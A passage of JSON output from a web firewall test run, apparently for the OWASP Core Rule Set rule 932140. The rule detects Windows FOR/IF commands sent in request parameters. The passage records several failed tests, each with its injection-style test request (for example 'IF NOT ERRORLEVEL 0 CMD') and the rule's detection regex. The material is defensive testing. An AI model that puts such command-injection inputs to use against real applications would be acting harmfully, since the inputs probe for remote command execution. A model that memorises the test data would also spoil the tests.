        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 78,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters" ]
    },
    "test" : {
      "test_id" : 78,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF++++++++DEFINED+variable+++++++CMD",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 79,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters" ]
    },
    "test" : {
      "test_id" : 79,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF++++NOT+DEFINED+_example+++++++ECHO+Value+Missing",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 80,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters" ]
    },
    "test" : {
      "test_id" : 80,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF++++++++ERRORLEVEL+0+++++++++++CMD",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 81,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters" ]
    },
    "test" : {
      "test_id" : 81,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF++++NOT+ERRORLEVEL+0+++++++++++CMD",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 82,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters" ]
    },
    "test" : {
      "test_id" : 82,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF++++++++CMDEXTVERSION+1++++++++GOTO+start_process",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
